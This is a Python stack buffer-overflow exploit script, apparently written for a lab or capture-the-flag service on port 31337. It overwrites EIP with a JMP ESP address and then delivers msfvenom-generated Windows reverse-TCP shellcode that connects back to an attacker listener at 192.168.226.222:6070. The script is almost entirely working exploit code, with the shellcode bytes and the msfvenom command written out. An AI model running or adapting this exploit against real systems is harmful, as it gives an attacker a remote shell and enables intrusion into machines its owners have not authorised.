#!/usr/bin/env python3

import socket
from struct import pack
# Target Information

RHOST = "192.168.226.225"   # IP of target Remote Host
RPORT = 31337   # Listening Port

buf_total = 1024        # Size of payload
offset_rp = 146         # No.of bytes before EIP
pointer_to_jmp_esp = pack("<I", 0x080414C3)     # pointer to Static memory location in program gadgets (to little endian)
sub_esp_0x10 = b"\x83\xec\x10"

# ShellCode
# ─[hhexme@kb]─[~/Desktop/bof]
# └──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=192.168.226.222 LPORT=6070 -b '\x00,\x0A' -f python --var-name shell_code
#
# [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
# [-] No arch selected, selecting arch: x86 from the payload
# Found 11 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 351 (iteration=0)
# x86/shikata_ga_nai chosen with final size 351
# Payload size: 351 bytes
# Final size of python file: 1998 bytes

shell_code =  b""
shell_code += b"\xbb\x47\x8e\xc8\x44\xdb\xd9\xd9\x74\x24\xf4"
shell_code += b"\x58\x31\xc9\xb1\x52\x31\x58\x12\x83\xe8\xfc"
shell_code += b"\x03\x1f\x80\x2a\xb1\x63\x74\x28\x3a\x9b\x85"
shell_code += b"\x4d\xb2\x7e\xb4\x4d\xa0\x0b\xe7\x7d\xa2\x59"
shell_code += b"\x04\xf5\xe6\x49\x9f\x7b\x2f\x7e\x28\x31\x09"
shell_code += b"\xb1\xa9\x6a\x69\xd0\x29\x71\xbe\x32\x13\xba"
shell_code += b"\xb3\x33\x54\xa7\x3e\x61\x0d\xa3\xed\x95\x3a"
shell_code += b"\xf9\x2d\x1e\x70\xef\x35\xc3\xc1\x0e\x17\x52"
shell_code += b"\x59\x49\xb7\x55\x8e\xe1\xfe\x4d\xd3\xcc\x49"
shell_code += b"\xe6\x27\xba\x4b\x2e\x76\x43\xe7\x0f\xb6\xb6"
shell_code += b"\xf9\x48\x71\x29\x8c\xa0\x81\xd4\x97\x77\xfb"
shell_code += b"\x02\x1d\x63\x5b\xc0\x85\x4f\x5d\x05\x53\x04"
shell_code += b"\x51\xe2\x17\x42\x76\xf5\xf4\xf9\x82\x7e\xfb"
shell_code += b"\x2d\x03\xc4\xd8\xe9\x4f\x9e\x41\xa8\x35\x71"
shell_code += b"\x7d\xaa\x95\x2e\xdb\xa1\x38\x3a\x56\xe8\x54"
shell_code += b"\x8f\x5b\x12\xa5\x87\xec\x61\x97\x08\x47\xed"
shell_code += b"\x9b\xc1\x41\xea\xdc\xfb\x36\x64\x23\x04\x47"
shell_code += b"\xad\xe0\x50\x17\xc5\xc1\xd8\xfc\x15\xed\x0c"
shell_code += b"\x52\x45\x41\xff\x13\x35\x21\xaf\xfb\x5f\xae"
shell_code += b"\x90\x1c\x60\x64\xb9\xb7\x9b\xef\x06\xef\x41"
shell_code += b"\x31\xee\xf2\x85\xd9\x59\x7b\x63\x8f\xb5\x2a"
shell_code += b"\x3c\x38\x2f\x77\xb6\xd9\xb0\xad\xb3\xda\x3b"
shell_code += b"\x42\x44\x94\xcb\x2f\x56\x41\x3c\x7a\x04\xc4"
shell_code += b"\x43\x50\x20\x8a\xd6\x3f\xb0\xc5\xca\x97\xe7"
shell_code += b"\x82\x3d\xee\x6d\x3f\x67\x58\x93\xc2\xf1\xa3"
shell_code += b"\x17\x19\xc2\x2a\x96\xec\x7e\x09\x88\x28\x7e"
shell_code += b"\x15\xfc\xe4\x29\xc3\xaa\x42\x80\xa5\x04\x1d"
shell_code += b"\x7f\x6c\xc0\xd8\xb3\xaf\x96\xe4\x99\x59\x76"
shell_code += b"\x54\x74\x1c\x89\x59\x10\xa8\xf2\x87\x80\x57"
shell_code += b"\x29\x0c\xb0\x1d\x73\x25\x59\xf8\xe6\x77\x04"
shell_code += b"\xfb\xdd\xb4\x31\x78\xd7\x44\xc6\x60\x92\x41"
shell_code += b"\x82\x26\x4f\x38\x9b\xc2\x6f\xef\x9c\xc6"

# Build Response

buf = b""
buf += b"A"*(offset_rp-len(buf))    # initialpadding
buf += pointer_to_jmp_esp           # EIP should point to JMP ESP code in .dll 
buf += sub_esp_0x10                 # make room for shellcode decoding and GetPointer function
buf += shell_code                   # Write to ESP and check for bad hex characters
buf += b"B"*(buf_total-len(buf))    # place for Shellcode 

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create IPV4 socket, TCP type
    s.connect((RHOST,RPORT)) # connect to remote host on   port
    s.send(buf + b"\n") 
    s.recv(1024)

except:
    print(f"[x] Failed!!")
    exit